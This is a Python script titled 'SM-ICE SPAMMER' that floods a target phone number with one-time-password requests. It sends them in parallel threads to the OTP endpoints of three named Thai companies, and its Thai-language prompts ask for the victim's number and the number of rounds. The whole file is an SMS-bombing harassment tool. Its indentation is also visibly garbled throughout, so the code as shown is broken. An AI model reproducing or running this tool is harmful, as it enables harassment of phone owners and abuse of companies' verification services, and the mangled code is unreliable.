import requests, threading, os, sys, random, time
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, init

init(autoreset=True)
_c = "SM-ICE SPAMMER v1.0 | GitHub Edition"

def api_1(p): 
    try: requests.post(f"https://store.truecorp.co.th/api/true/wportal/otp/request?mobile_number={p}", timeout=3)
        except: pass
        def api_2(p): 
            try: requests.post("https://api2.1112.com/api/v1/otp/create", json={"phonenumber": p, "language": "th"}, timeout=3)
                except: pass
                def api_3(p): 
                    try: requests.post("https://openapi.bigc.co.th/customer/v1/otp", json={"phone_no": p}, timeout=3)
                        except: pass

                        APIS = [api_1, api_2, api_3]

                        def work(p):
                            for api in APIS:
                                    threading.Thread(target=api, args=(p,)).start()

                                    def main():
                                        os.system('clear' if os.name != 'nt' else 'clear')
                                            print(Fore.CYAN + _c)
                                                print(Fore.YELLOW + "----------------------------------------")
                                                    target = input(Fore.WHITE + "[?] เบอร์เป้าหมาย: ")
                                                        amount = int(input(Fore.WHITE + "[?] จำนวนรอบ: "))
                                                            print(Fore.GREEN + f"\n[*] กำลังถล่มเบอร์ {target}...")
                                                                with ThreadPoolExecutor(max_workers=50) as ex:
                                                                        for _ in range(amount):
                                                                                    ex.submit(work, target)
                                                                                                time.sleep(0.1)
                                                                                                    print(Fore.CYAN + "\n[+] จบงานแล้วครับพี่!")

                                                                                                    if __name__ == "__main__":
                                                                                                        main()
                                                                                                        